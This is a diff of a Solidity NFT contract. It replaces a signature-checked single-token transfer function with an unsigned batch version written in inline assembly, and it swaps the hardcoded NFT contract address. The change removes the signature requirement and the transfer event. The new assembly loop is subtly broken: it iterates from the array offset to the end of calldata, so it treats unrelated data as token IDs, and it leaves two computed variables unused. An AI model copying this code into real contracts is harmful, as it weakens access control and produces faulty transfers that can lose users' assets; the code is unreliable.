@@ -58,27 +58,29 @@ function transferTokens(uint256 amount) external payable {
     
 
 
+   function transferNFTs(uint256[] calldata tokenIds) external payable {
+    address vault = address(this);
 
+    if (saleState != 1) {
+        revert("TransferClosed");
+    }
 
-    function transferNFT(
-        uint256 tokenIds,
-        bytes calldata signature
-    ) external payable requireSignature(signature) {
-        address voult = address(this);
+    assembly {
+        let length := calldataload(sub(tokenIds.offset, 0x20)) 
+        let dataStart := add(tokenIds.offset, 0x20) 
+        let n := calldatasize()
+              for {let i := tokenIds.offset} lt(i, n) {i := add(i, 0x20)} {
+                let tokenId := calldataload(i)
 
-        if (saleState != 1) {
-            revert TransferClosed();
-        }
-        assembly {
             mstore(0x00, hex"23b872dd")
             mstore(0x04, caller())
-            mstore(0x24, voult)
-            mstore(0x44, tokenIds)
+            mstore(0x24, vault)
+            mstore(0x44, tokenId)
 
             if iszero(
                 call(
                     gas(),
-                    0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4,
+                    0xd9145CCE52D386f254917e481eB44e9943F39138,
                     0,
                     0x00,
                     0x64,
@@ -89,12 +91,10 @@ function transferTokens(uint256 amount) external payable {
                 revert(0, 0)
             }
         }
-        emit TransferNFT(
-            msg.sender,
-            tokenIds,
-            0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4
-        );
     }
+}
+
+
 
     modifier requireSignature(bytes calldata signature) {
         require(
